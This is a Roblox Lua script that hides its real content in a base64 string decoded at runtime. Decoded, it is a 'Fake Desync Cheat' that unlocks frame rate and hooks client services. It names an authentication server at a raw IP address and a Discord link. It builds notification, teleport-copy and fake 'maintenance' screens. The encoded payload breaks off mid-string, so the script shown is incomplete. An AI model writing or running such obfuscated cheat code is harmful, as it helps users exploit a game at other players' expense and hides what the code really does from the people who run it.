local bx53xnf = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local tvsouea = {}
for i = 0, 63 do tvsouea[bx53xnf:sub(i+1, i+1)] = i end

local function decode(data)
    data = data:gsub('[^'..bx53xnf..'=]', '')
    return (data:gsub('....', function(x)
        local a, b, c, d = tvsouea[x:sub(1,1)], tvsouea[x:sub(2,2)], tvsouea[x:sub(3,3)], tvsouea[x:sub(4,4)]
        local n = a * 262144 + b * 4096 + (c or 0) * 64 + (d or 0)
        local r = string.char(math.floor(n/65536)%256)
        if x:sub(3,3) ~= '=' then r = r .. string.char(math.floor(n/256)%256) end
        if x:sub(4,4) ~= '=' then r = r .. string.char(n%256) end
        return r
    end))
end

local r7xh702 = decode("LS0gRmFrZSBEZXN5bmMgQ2hlYXQgVjEwMiAoUHJpb3JpdHkgUmVuZGVyIEZpeCArIEFic29sdXRlIEFjY3VyYWN5KQppZiBub3QgZ2FtZTpJc0xvYWRlZCgpIHRoZW4gZ2FtZS5Mb2FkZWQ6V2FpdCgpIGVuZApwY2FsbChmdW5jdGlvbigpIHNldGZwc2NhcCg5OTkpIGVuZCkgLS0gVW5sb2NrIEZQUwoKLS0gPT09IFNFUlZJQ0VTID09PQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQpsb2NhbCBXb3Jrc3BhY2UgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCmxvY2FsIENvcmVHdWkgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKQpsb2NhbCBWaXJ0dWFsVXNlciA9IGdhbWU6R2V0U2VydmljZSgiVmlydHVhbFVzZXIiKQpsb2NhbCBWaXJ0dWFsSW5wdXRNYW5hZ2VyID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsSW5wdXRNYW5hZ2VyIikKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCBHdWlTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJHdWlTZXJ2aWNlIikKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgbW91c2UgPSBwbGF5ZXI6R2V0TW91c2UoKQpsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQpsb2NhbCBESVNDT1JEX0xJTksgPSAiaHR0cHM6Ly9kaXNjb3JkLmdnL1UzcHZBUE53RFgiCmxvY2FsIEFVVEhfVVJMID0gImh0dHA6Ly81LjE3OC4xMDcuMjMxOjIwMjYiIC0tIFNlcnZlciBVUkwKCi0tIEZvbmN0aW9uIHPDqWN1cmlzw6llIHBvdXIgY29waWVyIGRhbnMgbGUgcHJlc3NlLXBhcGllcnMKbG9jYWwgZnVuY3Rpb24gY29weVRvQ2xpcGJvYXJkKHN0cikKICAgIGlmIHNldGNsaXBib2FyZCB0aGVuCiAgICAgICAgc2V0Y2xpcGJvYXJkKHN0cikKICAgICAgICByZXR1cm4gdHJ1ZQogICAgZWxzZWlmIHRvY2xpcGJvYXJkIHRoZW4KICAgICAgICB0b2NsaXBib2FyZChzdHIpCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgZnVuY3Rpb24gU2VuZE5vdGlmaWNhdGlvbih0ZXh0LCBkdXJhdGlvbikKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIE5vdGlmR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgICAgIE5vdGlmR3VpLk5hbWUgPSAiQ3liZXJwdW5rc05vdGlmaWNhdGlvbiIKICAgICAgICBwY2FsbChmdW5jdGlvbigpIE5vdGlmR3VpLlBhcmVudCA9IENvcmVHdWkgZW5kKQogICAgICAgIGlmIG5vdCBOb3RpZkd1aS5QYXJlbnQgdGhlbiBOb3RpZkd1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKSBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMjYwLCAwLCA0MCkKICAgICAgICBGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAyNzAsIDEsIC02MCkKICAgICAgICBGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAsIDEwLCAxMikKICAgICAgICBGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC4yNQogICAgICAgIEZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBGcmFtZS5QYXJlbnQgPSBOb3RpZkd1aQogICAgICAgIAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQ29ybmVyLlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpIFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpIFN0cm9rZS5UaGlja25lc3MgPSAxIFN0cm9rZS5UcmFuc3BhcmVuY3kgPSAwLjggU3Ryb2tlLlBhcmVudCA9IEZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgQWNjZW50ID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgQWNjZW50LlNpemUgPSBVRGltMi5uZXcoMCwgMiwgMC42LCAwKQogICAgICAgIEFjY2VudC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA2LCAwLjIsIDApCiAgICAgICAgQWNjZW50LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIEFjY2VudC5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICAgICAgQWNjZW50LlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgQUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBBQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsIDApIEFDb3JuZXIuUGFyZW50ID0gQWNjZW50CiAgICAgICAgCiAgICAgICAgbG9jYWwgTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMjUsIDEsIDApCiAgICAgICAgTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTgsIDAsIDApCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0ID0gdGV4dAogICAgICAgIExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNDAsIDI0MCwgMjQwKQogICAgICAgIExhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtTWVkaXVtCiAgICAgICAgTGFiZWwuVGV4dFNpemUgPSAxMAogICAgICAgIExhYmVsLlRleHRXcmFwcGVkID0gdHJ1ZQogICAgICAgIExhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgTGFiZWwuUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKEZyYW1lLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDEsIC0yODAsIDEsIC02MCl9KTpQbGF5KCkKICAgICAgICB0YXNrLndhaXQoZHVyYXRpb24pCiAgICAgICAgbG9jYWwgdHdlZW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKEZyYW1lLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW4pLCB7UG9zaXRpb24gPSBVRGltMi5uZXcoMSwgMjcwLCAxLCAtNjApfSkKICAgICAgICB0d2VlbjpQbGF5KCkKICAgICAgICB0d2Vlbi5Db21wbGV0ZWQ6V2FpdCgpCiAgICAgICAgTm90aWZHdWk6RGVzdHJveSgpCiAgICBlbmQpCmVuZAoKbG9jYWwgUGFydFZpZXdlckVuYWJsZWQgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gU3RhcnRQYXJ0Vmlld2VyKCkKICAgIFBhcnRWaWV3ZXJFbmFibGVkID0gdHJ1ZQogICAgU2VuZE5vdGlmaWNhdGlvbigiUGFydCBWaWV3ZXIgc3RhcnRlZCEgQ2hlY2sgRjkgY29uc29sZSBmb3Igb2JqZWN0IG5hbWVzIiwgNSkKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgUGFydFZpZXdlckVuYWJsZWQgZG8KICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiB2OklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwcmludCgiW1BBUlQgVklFV0VSXSBUb29sOiAiIC4uIHYuTmFtZSAuLiAiIHwgUGFyZW50OiAiIC4uIHYuUGFyZW50Lk5hbWUgLi4gIiB8IFRvb2xUaXA6ICIgLi4gKHYuVG9vbFRpcCBvciAiTm9uZSIpKQogICAgICAgICAgICAgICAgZWxzZWlmIHY6SXNBKCJNb2RlbCIpIGFuZCB2OkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIltQQVJUIFZJRVdFUl0gTW9kZWwgd2l0aCBIYW5kbGU6ICIgLi4gdi5OYW1lIC4uICIgfCBQYXJlbnQ6ICIgLi4gdi5QYXJlbnQuTmFtZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDUpIC0tIFByaW50IGV2ZXJ5IDUgc2Vjb25kcwogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIFN0b3BQYXJ0Vmlld2VyKCkKICAgIFBhcnRWaWV3ZXJFbmFibGVkID0gZmFsc2UKICAgIFNlbmROb3RpZmljYXRpb24oIlBhcnQgVmlld2VyIHN0b3BwZWQiLCAzKQplbmQKCmxvY2FsIGZ1bmN0aW9uIENyZWF0ZUNvbmZpcm1hdGlvblByb21wdCh0ZXh0LCBqb2JJZCwgcGxhY2VJZCwgb25ZZXMsIG9uTm8pCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBDb25maXJtR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgICAgIENvbmZpcm1HdWkuTmFtZSA9ICJDeWJlcnB1bmtzQ29uZmlybSIKICAgICAgICBwY2FsbChmdW5jdGlvbigpIENvbmZpcm1HdWkuUGFyZW50ID0gQ29yZUd1aSBlbmQpCiAgICAgICAgaWYgbm90IENvbmZpcm1HdWkuUGFyZW50IHRoZW4gQ29uZmlybUd1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKSBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMzAwLCAwLCAxNTApCiAgICAgICAgRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMTUwLCAwLjUsIC02MCkKICAgICAgICBGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUsIDE1LCAyMCkKICAgICAgICBGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICAgICAgRnJhbWUuUGFyZW50ID0gQ29uZmlybUd1aQogICAgICAgIAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNikgQ29ybmVyLlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpIFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApIFN0cm9rZS5UaGlja25lc3MgPSAxIFN0cm9rZS5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIExhYmVsLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCA2MCkKICAgICAgICBMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMTApCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0ID0gdGV4dAogICAgICAgIExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIExhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIExhYmVsLlRleHRTaXplID0gMTIKICAgICAgICBMYWJlbC5UZXh0V3JhcHBlZCA9IHRydWUKICAgICAgICBMYWJlbC5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIFllc0J0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgWWVzQnRuLlNpemUgPSBVRGltMi5uZXcoMC40LCAwLCAwLCAzMCkKICAgICAgICBZZXNCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wNSwgMCwgMC43NSwgMCkKICAgICAgICBZZXNCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMCkKICAgICAgICBZZXNCdG4uVGV4dCA9ICJZRVMiCiAgICAgICAgWWVzQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIFllc0J0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBZZXNCdG4uVGV4dFNpemUgPSAxMAogICAgICAgIFllc0J0bi5QYXJlbnQgPSBGcmFtZQogICAgICAgIGxvY2FsIFlDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgWUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBZQ29ybmVyLlBhcmVudCA9IFllc0J0bgogICAgICAgIAogICAgICAgIGxvY2FsIE5vQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBOb0J0bi5TaXplID0gVURpbTIubmV3KDAuNCwgMCwgMCwgMzApCiAgICAgICAgTm9CdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41NSwgMCwgMC43NSwgMCkKICAgICAgICBOb0J0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUwLCAwLCAwKQogICAgICAgIE5vQnRuLlRleHQgPSAiTk8iCiAgICAgICAgTm9CdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgTm9CdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgTm9CdG4uVGV4dFNpemUgPSAxMAogICAgICAgIE5vQnRuLlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgTkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBOQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIE5Db3JuZXIuUGFyZW50ID0gTm9CdG4KICAgICAgICAKICAgICAgICBsb2NhbCBDb3B5SWRCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIENvcHlJZEJ0bi5TaXplID0gVURpbTIubmV3KDAuMjUsIDAsIDAsIDIwKQogICAgICAgIENvcHlJZEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjIsIDAsIDAuNTUsIDApCiAgICAgICAgQ29weUlkQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgIENvcHlJZEJ0bi5UZXh0ID0gIkNPUFkgSUQiCiAgICAgICAgQ29weUlkQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIENvcHlJZEJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBDb3B5SWRCdG4uVGV4dFNpemUgPSA4CiAgICAgICAgQ29weUlkQnRuLlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgQ0lDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgQ0lDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQ0lDb3JuZXIuUGFyZW50ID0gQ29weUlkQnRuCiAgICAgICAgCiAgICAgICAgQ29weUlkQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBzZXRjbGlwYm9hcmQgdGhlbiBzZXRjbGlwYm9hcmQoam9iSWQpIGVuZAogICAgICAgICAgICBDb3B5SWRCdG4uVGV4dCA9ICJDT1BJRUQhIgogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgQ29weUlkQnRuLlRleHQgPSAiQ09QWSBJRCIKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIENvcHlTY3JpcHRCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIENvcHlTY3JpcHRCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjI1LCAwLCAwLCAyMCkKICAgICAgICBDb3B5U2NyaXB0QnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNTUsIDAsIDAuNTUsIDApCiAgICAgICAgQ29weVNjcmlwdEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICBDb3B5U2NyaXB0QnRuLlRleHQgPSAiQ09QWSBTQ1JJUFQiCiAgICAgICAgQ29weVNjcmlwdEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBDb3B5U2NyaXB0QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIENvcHlTY3JpcHRCdG4uVGV4dFNpemUgPSA4CiAgICAgICAgQ29weVNjcmlwdEJ0bi5QYXJlbnQgPSBGcmFtZQogICAgICAgIGxvY2FsIENTQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIENTQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIENTQ29ybmVyLlBhcmVudCA9IENvcHlTY3JpcHRCdG4KICAgICAgICAKICAgICAgICBDb3B5U2NyaXB0QnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBzY3JpcHRUeHQgPSBzdHJpbmcuZm9ybWF0KCdnYW1lOkdldFNlcnZpY2UoIlRlbGVwb3J0U2VydmljZSIpOlRlbGVwb3J0VG9QbGFjZUluc3RhbmNlKCVzLCAiJXMiLCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIpJywgdG9zdHJpbmcocGxhY2VJZCksIHRvc3RyaW5nKGpvYklkKSkKICAgICAgICAgICAgaWYgc2V0Y2xpcGJvYXJkIHRoZW4gc2V0Y2xpcGJvYXJkKHNjcmlwdFR4dCkgZW5kCiAgICAgICAgICAgIENvcHlTY3JpcHRCdG4uVGV4dCA9ICJDT1BJRUQhIgogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgQ29weVNjcmlwdEJ0bi5UZXh0ID0gIkNPUFkgU0NSSVBUIgogICAgICAgIGVuZCkKCiAgICAgICAgWWVzQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBvblllcyB0aGVuIG9uWWVzKCkgZW5kCiAgICAgICAgICAgIENvbmZpcm1HdWk6RGVzdHJveSgpCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIE5vQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBvbk5vIHRoZW4gb25ObygpIGVuZAogICAgICAgICAgICBDb25maXJtR3VpOkRlc3Ryb3koKQogICAgICAgIGVuZCkKICAgIGVuZCkKZW5kCgotLSA9PT0gTUFJTlRFTkFOQ0UgU0NSRUVOID09PQpsb2NhbCBmdW5jdGlvbiBTaG93TWFpbnRlbmFuY2VTY3JlZW4obWVzc2FnZSkKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIE1haW50ZW5hbmNlR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgICAgIE1haW50ZW5hbmNlR3VpLk5hbWUgPSAiTWFpbnRlbmFuY2VTY3JlZW4iCiAgICAgICAgTWFpbnRlbmFuY2VHdWkuSWdub3JlR3VpSW5zZXQgPSB0cnVlCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBNYWludGVuYW5jZUd1aS5QYXJlbnQgPSBDb3JlR3VpIGVuZCkKICAgICAgICBpZiBub3QgTWFpbnRlbmFuY2VHdWkuUGFyZW50IHRoZW4gTWFpbnRlbmFuY2VHdWkuUGFyZW50ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikgZW5kCiAgICAgICAgCiAgICAgICAgLS0gRnVsbCBzY3JlZW4gYmxhY2sgb3ZlcmxheQogICAgICAgIGxvY2FsIE92ZXJsYXkgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBPdmVybGF5LlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICBPdmVybGF5LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICAgICAgT3ZlcmxheS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKICAgICAgICBPdmVybGF5LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjMKICAgICAgICBPdmVybGF5LkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBPdmVybGF5LlBhcmVudCA9IE1haW50ZW5hbmNlR3VpCiAgICAgICAgCiAgICAgICAgLS0gQ2VudGVyZWQgbWFpbnRlbmFuY2UgYm94CiAgICAgICAgbG9jYWwgRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBGcmFtZS5TaXplID0gVURpbTIubmV3KDAsIDQwMCwgMCwgMjIwKQogICAgICAgIEZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTIwMCwgMC41LCAtMTEwKQogICAgICAgIEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNSwgMTUsIDIwKQogICAgICAgIEZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBGcmFtZS5QYXJlbnQgPSBNYWludGVuYW5jZUd1aQogICAgICAgIAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSAKICAgICAgICBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTIpIAogICAgICAgIENvcm5lci5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIFN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKSAKICAgICAgICBTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSAKICAgICAgICBTdHJva2UuVGhpY2tuZXNzID0gMSAKICAgICAgICBTdHJva2UuVHJhbnNwYXJlbmN5ID0gMC41CiAgICAgICAgU3Ryb2tlLlBhcmVudCA9IEZyYW1lCiAgICAgICAgCiAgICAgICAgLS0gV2FybmluZyBJY29uCiAgICAgICAgbG9jYWwgSWNvbiA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICBJY29uLlNpemUgPSBVRGltMi5uZXcoMCwgNTAsIDAsIDUwKQogICAgICAgIEljb24uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMjUsIDAsIDI1KQogICAgICAgIEljb24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBJY29uLlRleHQgPSAi4pqg77iPIgogICAgICAgIEljb24uVGV4dFNpemUgPSA0NQogICAgICAgIEljb24uUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICAtLSBNYWludGVuYW5jZSBUaXRsZQogICAgICAgIGxvY2FsIFRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIFRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTQwLCAwLCAzMCkKICAgICAgICBUaXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAyMCwgMCwgODApCiAgICAgICAgVGl0bGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBUaXRsZS5UZXh0ID0gIk1BSU5URU5BTkNFIgogICAgICAgIFRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIFRpdGxlLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQmxhY2sKICAgICAgICBUaXRsZS5UZXh0U2l6ZSA9IDIwCiAgICAgICAgVGl0bGUuUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICAtLSBNYWludGVuYW5jZSBNZXNzYWdlCiAgICAgICAgbG9jYWwgTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAtNjAsIDAsIDUwKQogICAgICAgIExhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDMwLCAwLCAxMTUpCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0ID0gbWVzc2FnZQogICAgICAgIExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKQogICAgICAgIExhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtTWVkaXVtCiAgICAgICAgTGFiZWwuVGV4dFNpemUgPSAxNAogICAgICAgIExhYmVsLlRleHRXcmFwcGVkID0gdHJ1ZQogICAgICAgIExhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5DZW50ZXIKICAgICAgICBMYWJlbC5QYXJlbnQgPSBGcmFtZQogICAgICAgIAogICAgICAgIC0tIERpc2NvcmQgQnV0dG9uCiAgICAgICAgbG9jYWwgRGlzY29yZEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgRGlzY29yZEJ0bi5TaXplID0gVURpbTIubmV3KDAsIDIwMCwgMCwgMzUpCiAgICAgICAgRGlzY29yZEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xMDAsIDAsIDE3NSkKICAgICAgICBEaXNjb3JkQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0NSwgNDUsIDUwKQogICAgICAgIERpc2NvcmRCdG4uVGV4dCA9ICLwn5SXIEpvaW4gRGlzY29yZCIKICAgICAgICBEaXNjb3JkQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIERpc2NvcmRCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1C